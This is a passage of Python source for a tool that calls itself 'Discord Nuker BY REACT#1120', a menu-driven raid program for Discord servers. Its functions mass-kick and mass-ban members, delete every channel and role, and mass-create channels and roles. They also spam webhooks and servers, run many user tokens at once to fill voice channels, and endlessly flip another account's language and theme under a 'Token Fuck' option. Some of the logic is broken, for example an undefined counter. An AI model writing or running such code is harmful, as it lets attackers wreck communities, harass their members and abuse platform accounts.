                        "channel_id": VOICE_ID,
                        "self_mute":True,
                        "self_deaf":True
                    }
                }
            )
        )
        while True:
            time.sleep(heartbeat_interval/1000)
            try:
                ws.send(json.dumps({
                    "op":1,
                    "d":None}))
            except Exception:
                break

    def Online(Token,Type,Game):
        ws = websocket.WebSocket()
        ws.connect(URL.DiscordWebsocket)
        RECV = json.loads(ws.recv())
        heartbeat_interval = RECV['d']['heartbeat_interval']
        Status = {
            1 :  {
                        "name": Game,
                        "type": 0
                    },
            2 : {
                        "name": Game,
                        "type": 1,
                        "url": "https://www.twitch.tv/soulless.cc"
                    },
                
            3 : {
                        "name": Game,
                        "type": 2
                    },
                
            4 : {
                        "name": Game,
                        "type": 3
                    }
            }

        ws.send(json.dumps({
            "op":2,
            "d": {
                "token":Token,
                "properties": {
                    "$os":"windows",
                    "$browser":"Discord",
                    "$device": "desktop" 
                },
                "presence": {
                    "game": Status[Type],
                    "status": "online",
                    "since":0,
                    "afk":False
                }
            },
            "s":None,
            "t":None
        }
    )
)
        while True:
            time.sleep(heartbeat_interval/1000)
            try:
                ws.send(json.dumps({
                    "op":1,
                    "d":None}))
            except Exception:
                break

    def Livestream(token, VOICE_ID):
        ws = websocket.WebSocket()
        ws.connect(URL.DiscordWebsocket)
        RECV = json.loads(ws.recv())
        heartbeat_interval = RECV['d']['heartbeat_interval']
        ws.send(json.dumps({
                    "op":2,
                    "d": {
                        "token":token, 
                        "properties": {
                            "$os":"windows",
                            "$browser":"Discord",
                            "$device": "desktop" 
                            }
                        }
                    }
                )
            )
        ws.send(json.dumps({
                    "op":4,
                    "d": {
                        "guild_id":Constant.SERVER_ID, 
                        "channel_id": VOICE_ID,
                        "self_mute":True,
                        "self_deaf":True
                    }
                }
            )
        )
        ws.send(json.dumps({
            "op":18,
            "d": {
                "type":"guild",
                "guild_id":Constant.SERVER_ID, 
                "channel_id": VOICE_ID,
                "preferred_region":"singapore"
                }
            }
        )
    )
        while True:
            time.sleep(heartbeat_interval/1000)
            try:
                ws.send(json.dumps({
                    "op":1,
                    "d":None}))
            except Exception:
                break
    
    def LanguageSpam():
        Languages = [
            ["bg","Bulgarian"],  
            ["zh-CN","Chinese"],
            ["hr","Croatian"],
            ["cs","Czech"],
            ["da","Danish"],
            ["nl","Dutch"],
            ["fi","Finnish"],    
            ["fr","French"],
            ["de","German"],
            ["el","Greek"],
            ["hi","Hindi"],
            ["hu","Hungarian"], 
            ["it","Italian"],
            ["ja","Japanese"],
            ["ko","Korean"],
            ["lt","Lithuanian"],
            ["no","Norwegian"],
            ["pl","Polish"],
            ["pt-BR","Portuguese"],
            ["ro","Romanian"],
            ["ru","Russian"],
            ["es-ES","Spanish"],
            ["sv-SE","Swedish"],
            ["th","Thai"],
            ["tr","Turkish"],
            ["uk","Ukrainian"],       
            ["vi","Vietnamese"]
        ]
        while True:
            for Language in Languages:
                response = requests.patch(f"{URL.Canary}api/v9/users/@me/settings",headers=ReqHeader.DiscordHeader(), json={
                    "locale": Language[0]
                })

                if response.status_code in Status.SuccessStatus:
                    Status.Success(f"Language changed to {Language[1]}")

    def ThemeFlashingBlack():
        while True:
            for Theme in ["dark"]  :
                response = requests.patch(f"{URL.BaseURL}users/@me/settings",headers=ReqHeader.DiscordHeader(), json={
                    "theme": Theme

                })
                if response.status_code in Status.SuccessStatus:
                    Status.Success(f"Theme changed to {Theme}")

    def ThemeFlashingWhite():
        while True:
            for Theme in ["light"]  :
                response = requests.patch(f"{URL.BaseURL}users/@me/settings",headers=ReqHeader.DiscordHeader(), json={
                    "theme": Theme

                })
                if response.status_code in Status.SuccessStatus:
                    Status.Success(f"Theme changed to {Theme}")

class ThreadFunction:

    def Channel_ID():
        print(Data.GetChannel_ID())
    
    def Member_ID():
        print(Data.GetMember_ID())
    
    def Role_ID():
        print(Data.GetRole_ID())
    
    def ThreadThemeFlash():
        threads_create = []
        func = [Discord.ThemeFlashingWhite,Discord.ThemeFlashingBlack]
        with ThreadPoolExecutor(max_workers=4) as executor:
            for i in range(4):
                time.sleep(0.045)
                threads_create.append(executor.submit(func[i]))
    
    def ThreadSpamLanguage():
        threads_create = []
        with ThreadPoolExecutor(max_workers=2) as executor:
            for i in range(3):
                time.sleep(0.045)
                threads_create.append(executor.submit(Discord.LanguageSpam))    

    def ThreadTokenFuck():
        threads_create = []
        func = [ThreadFunction.ThreadThemeFlash,Discord.LanguageSpam]
        with ThreadPoolExecutor(max_workers=2) as executor:
            for i in range(2):
                time.sleep(0.045)
                threads_create.append(executor.submit(func[i]))

    def ThreadChangeChannelName():
        if Constant.TOKEN is not False and Constant.SERVER_ID is not False:
            Channels = Data.GetChannel_ID()
    
    def ThreadCreateRole():
        if Constant.TOKEN is not False and Constant.SERVER_ID is not False:
            threads_create = [] 
            Num = int(input(f"{Constant.Space}{Colour.YELLOW}"))
            Name = input(f"{Constant.Space}{Colour.YELLOW}")
            with ThreadPoolExecutor(max_workers=Num) as executor:
                for i in range(Num):
                    time.sleep(0.045)
                    threads_create.append(executor.submit(Discord.CreateRole,Name,))
    
    def ThreadDeleteRole():
        if Constant.TOKEN is not False:
            Roles = Data.GetRole_ID()
            threads_create = [] 
            with ThreadPoolExecutor(max_workers=len(Roles)) as executor:
                for Role in Roles:
                    threads_create.append(executor.submit(Discord.DeleteRole,str(Role),))

    def ThreadCreateCategory():
        if Constant.TOKEN is not False and Constant.SERVER_ID is not False:
            threads_create = [] 
            Num = int(input(f"{Constant.Space}{Colour.YELLOW}"))
            Name = input(f"{Constant.Space}{Colour.YELLOW}")
            with ThreadPoolExecutor(max_workers=Num) as executor:
                for i in range(Num):
                    time.sleep(0.045)
                    threads_create.append(executor.submit(Discord.CreateCategory,Name,))
    
    def ThreadCreateVoice():
        if Constant.TOKEN is not False and Constant.SERVER_ID is not False:
            threads_create = [] 
            Num = int(input(f"{Constant.Space}{Colour.YELLOW}"))
            Name = input(f"{Constant.Space}{Colour.YELLOW}")
            with ThreadPoolExecutor(max_workers=Num) as executor:
                for i in range(Num):
                    time.sleep(0.045)
                    threads_create.append(executor.submit(Discord.CreateVoiceChannel,Name,))
            
    def ThreadCreateChannel():
        if Constant.TOKEN is not False and Constant.SERVER_ID is not False:
            threads_create = [] 
            Num = int(input(f"{Constant.Space}{Colour.YELLOW}Number : "))
            Name = input(f"{Constant.Space}{Colour.YELLOW}Name : ")
            with ThreadPoolExecutor(max_workers=Num) as executor:
                for i in range(Num):
                    time.sleep(0.045)
                    threads_create.append(executor.submit(Discord.CreateChannel,Name,))
            
    def ThreadDeleteChannel():
        if Constant.TOKEN is not False:
            Channels = Data.GetChannel_ID()
            threads_create = [] 
            with ThreadPoolExecutor(max_workers=len(Channels)) as executor:
                for Channel in Channels:
                    threads_create.append(executor.submit(Discord.DeleteChannel,str(Channel),))

    def ThreadSpamWebhook():
        ChannelID = input(f"{Constant.Space}{Colour.YELLOW}Channel ID :")
        response = requests.get(f"{URL.BaseURL}channels/{ChannelID}/webhooks",headers=ReqHeader.DiscordHeader())
        webhooks = []
        if response.status_code in Status.SuccessStatus:
            if len(response.json()) > 1:
                for i in range(len(response.json())):
                    print(response.json()[i])
                    webhooks.append(f'{URL.WebhookBase}{response.json()[i]["id"]}/{response.json()[i]["token"]}')
            while len(webhooks) < 10:
                response = requests.post(f"{URL.BaseURL}channels/{ChannelID}/webhooks",headers=ReqHeader.DiscordHeader(),
                    json = {
                        "name":"React"
                    })
                webhooks.append(f'{URL.WebhookBase}{response.json()["id"]}/{response.json()["token"]}')

            Threads =[] 
            Message = input(f"{Constant.Space}{Colour.YELLOW}>")


            try:
                
                for i in range(int(input(f"{Constant.Space}{Colour.YELLOW}>"))):
                    for webhook in webhooks:
                        t = threading.Thread(target=Discord.SendWebhook, args=(webhook,Message,))
                        Threads.append(t)
                
                for Thread in Threads:
                    Thread.start()
                    time.sleep(0.65)

                for Thread in Threads:
                    Thread.join()

            except ValueError:
                print("Number of thread should only be an integer")

    def ThreadKick():
        if Constant.TOKEN is True and Constant.SERVER_ID is True:
            Members = Data.GetMember_ID()
            
            Member_1 = []
            Member_2 = []
            Member_3 = []
            Member_4 = []

            for Member in Members:
                if len(Member_1) != round(len(Members)/4):
                    Member_1.append(Member)
                
                elif len(Member_2) != round(len(Members)/4):
                    Member_2.append(Member)
                
                elif len(Member_3) != round(len(Members)/4):
                    Member_3.append(Member)
                
                elif len(Member_4) != round(len(Members)/4):
                    Member_4.append(Member)
                
                else:
                    pass
                
            while True:
                try:
                    threading.Thread(target=Discord.Kick, args=(Member_1[num])).start()
                    threading.Thread(target=Discord.Kick, args=(Member_2[num])).start()
                    threading.Thread(target=Discord.Kick, args=(Member_3[num])).start()
                    threading.Thread(target=Discord.Kick, args=(Member_4[num])).start()

                except IndexError:
                    break

                except:
                    pass

                try:
                    threading.Thread(target=Discord.Kick, args=(Member_4[num])).start()

                except IndexError:
                    break

                except:
                    pass

                num = num + 1
        
        else:
            print("")

    def ThreadBan():
        if Constant.TOKEN is True and Constant.SERVER_ID is True:
            Members = Data.GetMember_ID()
            
            Member_1 = []
            Member_2 = []
            Member_3 = []
            Member_4 = []

            for Member in Members:
                if len(Member_1) != round(len(Members)/4):
                    Member_1.append(Member)
                
                elif len(Member_2) != round(len(Members)/4):
                    Member_2.append(Member)
                
                elif len(Member_3) != round(len(Members)/4):
                    Member_3.append(Member)
                
                elif len(Member_4) != round(len(Members)/4):
                    Member_4.append(Member)
                
                else:
                    pass
            
            while num > round(len(Members/4)):
                try:
                    threading.Thread(target=Discord.Ban, args=(Member_1[num])).start()
                    threading.Thread(target=Discord.Ban, args=(Member_2[num])).start()
                    threading.Thread(target=Discord.Ban, args=(Member_3[num])).start()
                    threading.Thread(target=Discord.Ban, args=(Member_4[num])).start()
                    num = num + 1

                except IndexError:
                    break

                except:
                    pass 
        
        else:
            print("")


    def ThreadLivestream():
        if Constant.SERVER_ID is not False:

            VOICE_ID = input(f"{Constant.Space}{Colour.YELLOW}Voice channel ID : ")
            threads_create = [] 
            with ThreadPoolExecutor(max_workers=len(Constant.TOKENS)) as executor:
                for token in Constant.TOKENS:
                    threads_create.append(executor.submit(Discord.Livestream,token,VOICE_ID,))
        
        else:
            print("") 
    
    def ThreadConnect():
        if Constant.SERVER_ID is not False:
            VOICE_ID = input(f"{Constant.Space}{Colour.YELLOW}Voice channel ID : ")
            threads_create = [] 
            with ThreadPoolExecutor(max_workers=len(Constant.TOKENS)) as executor:
                for token in Constant.TOKENS:
                    threads_create.append(executor.submit(Discord.Connect,token,VOICE_ID,))

        else:
            pass

    def ThreadOnline():
        if Constant.SERVER_ID is not False:
            Type = int(input(f"{Constant.Space}{Colour.YELLOW}Type : "))
            Game = input(f"{Constant.Space}{Colour.YELLOW}Game : ")
            threads_create = [] 
            with ThreadPoolExecutor(max_workers=len(Constant.TOKENS)) as executor:
                for token in Constant.TOKENS:
                    threads_create.append(executor.submit(Discord.Online,token,Type,Game,))
        else:
            print("")

class Main:

    FunctionDict = {
        1: [ThreadFunction.Channel_ID,"Scrape Channels","Scrape Channels"], 
        2: [ThreadFunction.Member_ID,"Scrape Members","Scrape Members"],
        3: [ThreadFunction.Role_ID,"Scrape Roles","Scrape Roles"], 
        4: [ThreadFunction.ThreadKick,"Kick","เเตะ"],
        5: [ThreadFunction.ThreadBan,"Ban","เเบน"],
        6: [Discord.Join,"Join","เข้าเซิฟ"],
        7: [Discord.Leave,"Leave","ออกเซิฟ"], 
        8: [Discord.CreateWebhook,"Create Webhook","สร้าง Webhook"],
        9: [ThreadFunction.ThreadSpamWebhook,"Spam Webhook","สเเปม Webhook"],
        10: [ThreadFunction.ThreadConnect,"Connect","เข้าห้องเสียง"], 
        11: [ThreadFunction.ThreadOnline,"Online","ขึ้นสถานะ Online"],
        12: [ThreadFunction.ThreadLivestream,"Livestream","ไลฟ์สตรีม"],
        13: [ThreadFunction.ThreadCreateChannel,"Create Channels","สร้างห้องเเชท"],
        14: [ThreadFunction.ThreadDeleteChannel,"Delete Channels","ลบห้อง"],
        15: [Discord.ChangeChannelName,"Channel Name","เเก้ชื่อห้อง"],
        16: [ThreadFunction.ThreadCreateCategory,"Create Category","สร้างหมวดหมู่"],
        17: [ThreadFunction.ThreadCreateVoice,"Create Voice","สร้างห้องเสียง"],
        18: [ThreadFunction.ThreadCreateRole,"Create Role","สร้างยศ"],
        19: [ThreadFunction.ThreadDeleteRole,"Delete Role","ลบยศ"],
        20: [Discord.ChangeRoleName,"Change Role","เปลี่ยนชื่ยศ"],
        21: ["","Change Nickname","Change Nickname"],
        22: ["","Server Name","Server Name"],
        23: [Discord.ChangeServerImage,"Server Picture","Server Picture"],
        24: ["","Spam Channel","Spam Channel"],
        25: [ThreadFunction.ThreadSpamLanguage,"Language Spam",""],
        26: [ThreadFunction.ThreadThemeFlash,"Theme Flash",""],
        27: [Discord.CreateServer,"Server Spam",""],
        28: [ThreadFunction.ThreadTokenFuck,"Token Fuck","Token Fuck"],
        29: [Discord.ChangeStatus,"Change Status","เปลี่ยนสถานะ"],
        30: ["","Login Token","Login Token"],
        31: ["","Nuke Server","Nuke Server"],
        32: [Data.GetTokenInfo,"Token Info",""],
        33: [Discord.CopyServer,"Copy Server",""],
        34: ["","",""],
        35: ["","",""],
        36: [exit,"Exit","ออก"]
    }

    def run(Run =False):
        if Function.CheckInternet() is True:
            Function.Clear()
            Function.Menu()
            ctypes.windll.kernel32.SetConsoleTitleW("Disocrd Nuker BY REACT#1120 | Ready")
            if Run is False:
                Function.DiscordRPC()
                if Constant.CheckForUpdate is True:
                    Stat , Respond =Update.CheckUpdate(Constant.CheckForUpdate)

                    if Stat == "UPDATE" and Respond.upper() in ["Y","YES"]:
                        Update.UpdateProgram()
                else:
                    pass
            Function.Clear()
            Function.Menu()
            while True:
                try:    
                    Choice = int(input(f"{Constant.Space}{Colour.YELLOW}ROOT{Colour.WHITE}@{Colour.YELLOW}REACT>> {Colour.WHITE}"))
                    ctypes.windll.kernel32.SetConsoleTitleW(f"Discord Nuker BY REACT#1120 | Running -> {Main.FunctionDict[Choice][1]}")
                    Main.FunctionDict[Choice][0]()

                    if input(f"{Constant.Space}{Colour.YELLOW}CONTINUE ? [ Y/N ] ").upper() in ["Y","YES"]:
                        Main.run(Run=True)
                        break
                    
                    else:
                        Main.FunctionDict[36][0]()

                except (ValueError, KeyError) as e:
                    Status.Fail("Invalid choice")

        else:
            Function.Clear()
            print(f"{Constant.Space}{Colour.RED}No Internet Connection")

def start(START=False):
    os.system("color 07")
    title = ''
    for char in "Disocrd Nuker BY REACT#1120 ^| Loading...": 
        title = title + char
        ctypes.windll.kernel32.SetConsoleTitleW(f'{title}')

    if START is True:
        Function.Spinner()
        try:
            ctypes.windll.kernel32.SetConsoleTitleW("Disocrd Nuker BY REACT#1120 | Loading...")
            Main.run()
        except Exception as e:
            print(e)
    else:
        print(f"{Constant.Space}Unable to run")

if __name__ == "__main__":
    start(Constant.START)
